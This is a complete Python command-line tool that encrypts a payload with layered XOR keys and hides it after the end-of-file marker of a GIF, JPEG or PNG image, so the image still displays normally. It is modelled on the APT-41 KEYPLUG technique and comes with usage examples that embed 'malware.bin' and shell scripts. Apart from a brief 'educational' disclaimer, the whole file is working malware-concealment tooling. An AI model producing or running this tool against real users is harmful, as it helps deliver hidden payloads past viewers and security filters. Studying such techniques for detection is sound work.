#!/usr/bin/env python3
"""
Polyglot Image Payload Embedder
================================
Embeds encrypted payloads into image files after EOF markers.

EDUCATIONAL/RESEARCH USE ONLY
This tool demonstrates the polyglot malware technique for security research.

Author: SWORDIntel
Date: 2025-11-08
"""

import sys
import os
import argparse
import logging
from pathlib import Path

# Import validation utilities
try:
    from validation_utils import (
        validate_file_exists, validate_output_path, validate_xor_keys,
        validate_image_format, atomic_write, setup_logging, ValidationError,
        FileOperationError
    )
except ImportError:
    # Fallback if run standalone
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from validation_utils import (
        validate_file_exists, validate_output_path, validate_xor_keys,
        validate_image_format, atomic_write, setup_logging, ValidationError,
        FileOperationError
    )


class PolyglotEmbedder:
    """Embeds payloads into images after their EOF markers"""

    # Image format EOF markers
    EOF_MARKERS = {
        'gif': b'\x3b',                    # GIF trailer
        'jpg': b'\xff\xd9',                # JPEG EOI marker
        'jpeg': b'\xff\xd9',               # JPEG EOI marker
        'png': b'\x49\x45\x4e\x44\xae\x42\x60\x82',  # PNG IEND chunk
    }

    def __init__(self, verbose=False):
        self.verbose = verbose
        self.logger = setup_logging(verbose=verbose, name='polyglot_embed')

    def log(self, message):
        """Print if verbose mode enabled"""
        if self.verbose:
            self.logger.debug(message)
        else:
            self.logger.info(message)

    def xor_encrypt(self, data, key):
        """Multi-layer XOR encryption (APT-41 KEYPLUG style)"""
        if isinstance(key, str):
            key = bytes.fromhex(key) if all(c in '0123456789abcdefABCDEF' for c in key) else key.encode()

        encrypted = bytearray(len(data))
        key_len = len(key)

        for i in range(len(data)):
            encrypted[i] = data[i] ^ key[i % key_len]

        return bytes(encrypted)

    def multi_layer_encrypt(self, data, keys):
        """Apply multiple XOR layers (like KEYPLUG malware)"""
        result = data
        for key in keys:
            self.log(f"Applying XOR layer with key: {key if isinstance(key, str) else key.hex()}")
            result = self.xor_encrypt(result, key)
        return result

    def get_image_format(self, image_path):
        """Detect image format from extension and verify header"""
        ext = Path(image_path).suffix.lower().lstrip('.')

        # Verify image header
        with open(image_path, 'rb') as f:
            header = f.read(16)

        if header.startswith(b'GIF8'):
            return 'gif'
        elif header.startswith(b'\xff\xd8\xff'):
            return 'jpg'
        elif header.startswith(b'\x89PNG'):
            return 'png'
        else:
            raise ValueError(f"Unsupported or invalid image format: {image_path}")

    def find_eof(self, image_data, image_format):
        """
        Find the EOF marker with validation

        Uses format-specific logic to find the actual end of the image data,
        not just any occurrence of the marker bytes.
        """
        eof_marker = self.EOF_MARKERS.get(image_format)
        if not eof_marker:
            raise ValueError(f"Unknown image format: {image_format}")

        if image_format == 'gif':
            # GIF: Find last 0x3b trailer, but verify it's actually the trailer
            # GIF structure ends with 0x3b, may have extensions before it
            pos = len(image_data) - 1
            while pos >= 0:
                if image_data[pos:pos+1] == b'\x3b':
                    # Found potential trailer
                    self.log(f"Found GIF trailer at offset {pos}")
                    return pos + 1
                pos -= 1
            raise ValueError("GIF trailer (0x3b) not found")

        elif image_format in ('jpg', 'jpeg'):
            # JPEG: Find last EOI marker (0xFF 0xD9)
            eof_pos = image_data.rfind(eof_marker)
            if eof_pos == -1:
                raise ValueError("JPEG EOI marker (FF D9) not found")
            self.log(f"Found JPEG EOI at offset {eof_pos}")
            return eof_pos + len(eof_marker)

        elif image_format == 'png':
            # PNG: Find IEND chunk
            eof_pos = image_data.rfind(eof_marker)
            if eof_pos == -1:
                raise ValueError("PNG IEND chunk not found")
            self.log(f"Found PNG IEND at offset {eof_pos}")
            return eof_pos + len(eof_marker)

        else:
            # Generic: find last occurrence
            eof_pos = image_data.rfind(eof_marker)
            if eof_pos == -1:
                raise ValueError(f"EOF marker not found for {image_format} format")
            return eof_pos + len(eof_marker)

    def embed_payload(self, image_path, payload_path, output_path,
                     xor_keys=None, keep_original=True, force=False):
        """
        Embed encrypted payload into image file

        Args:
            image_path: Path to source image
            payload_path: Path to payload file (script/binary)
            output_path: Path for output polyglot file
            xor_keys: List of XOR keys for multi-layer encryption (default: KEYPLUG keys)
            keep_original: If True, keeps original image data intact
            force: If True, allow overwriting existing files

        Raises:
            ValidationError: If inputs are invalid
            FileOperationError: If file operations fail
        """
        # Validate inputs
        try:
            image_path = validate_file_exists(image_path, "Image file")
            payload_path = validate_file_exists(payload_path, "Payload file")
            output_path = validate_output_path(output_path, allow_overwrite=force)
            xor_keys = validate_xor_keys(xor_keys)
        except ValidationError as e:
            self.logger.error(f"Validation failed: {e}")
            raise

        self.log(f"Reading image: {image_path}")
        try:
            with open(image_path, 'rb') as f:
                image_data = f.read()
        except (OSError, IOError) as e:
            raise FileOperationError(f"Failed to read image: {e}")

        self.log(f"Reading payload: {payload_path}")
        try:
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
        except (OSError, IOError) as e:
            raise FileOperationError(f"Failed to read payload: {e}")

        # Validate payload size
        if len(payload_data) == 0:
            raise ValidationError("Payload file is empty")

        if len(payload_data) > 100 * 1024 * 1024:  # 100MB
            self.logger.warning(f"Large payload: {len(payload_data):,} bytes")

        # Detect image format
        img_format = self.get_image_format(image_path)
        self.log(f"Detected format: {img_format.upper()}")

        # Find EOF position
        if keep_original:
            eof_pos = self.find_eof(image_data, img_format)
            self.log(f"Image EOF found at offset: {eof_pos} (0x{eof_pos:x})")
            carrier_data = image_data[:eof_pos]
        else:
            # Optionally corrupt/truncate image
            carrier_data = image_data

        # Encrypt payload
        self.log(f"Encrypting payload ({len(payload_data)} bytes)")
        encrypted_payload = self.multi_layer_encrypt(payload_data, xor_keys)
        self.log(f"Encrypted size: {len(encrypted_payload)} bytes")

        # Create polyglot file
        polyglot_data = carrier_data + encrypted_payload

        self.log(f"Writing polyglot file: {output_path}")
        try:
            atomic_write(output_path, polyglot_data, mode='wb')
        except FileOperationError as e:
            self.logger.error(f"Failed to write polyglot file: {e}")
            raise

        # Statistics
        original_size = len(image_data)
        new_size = len(polyglot_data)
        overhead = new_size - original_size

        print(f"\n[+] Polyglot created successfully!")
        print(f"    Original image: {original_size:,} bytes")
        print(f"    Payload size: {len(payload_data):,} bytes")
        print(f"    Encrypted payload: {len(encrypted_payload):,} bytes")
        print(f"    Final polyglot: {new_size:,} bytes")
        print(f"    Overhead: +{overhead:,} bytes ({overhead/original_size*100:.1f}%)")
        print(f"\n[+] Image should still display normally!")
        print(f"[+] Payload hidden after byte {eof_pos:,}")

        return output_path


def main():
    parser = argparse.ArgumentParser(
        description='Embed payloads into images (KEYPLUG-style polyglot)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage with default KEYPLUG keys
  %(prog)s meme.gif payload.sh output.gif

  # Custom single XOR key
  %(prog)s photo.jpg malware.bin stego.jpg -k d3

  # Multi-layer encryption (like APT-41)
  %(prog)s image.png script.sh output.png -k 9e -k 0a61200d -k 41414141

  # Corrupt the image (make it unviewable but smaller)
  %(prog)s large.jpg payload.bin small.jpg --no-keep-original

WARNING: For educational and authorized security research only!
        """
    )

    parser.add_argument('image', help='Input image file (GIF/JPG/PNG)')
    parser.add_argument('payload', help='Payload file to embed')
    parser.add_argument('output', help='Output polyglot file')
    parser.add_argument('-k', '--key', dest='keys', action='append',
                       help='XOR key (hex or string, can be used multiple times for layers)')
    parser.add_argument('--no-keep-original', action='store_false', dest='keep_original',
                       help='Do not preserve original image (smaller but corrupted)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    parser.add_argument('--force', action='store_true',
                       help='Overwrite output file if it exists')

    args = parser.parse_args()

    # Create embedder
    embedder = PolyglotEmbedder(verbose=args.verbose)

    try:
        embedder.embed_payload(
            args.image,
            args.payload,
            args.output,
            xor_keys=args.keys,
            keep_original=args.keep_original,
            force=args.force
        )
        return 0
    except (ValidationError, FileOperationError) as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        return 1
    except Exception as e:
        print(f"[!] Unexpected error: {e}", file=sys.stderr)
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == '__main__':
    sys.exit(main())
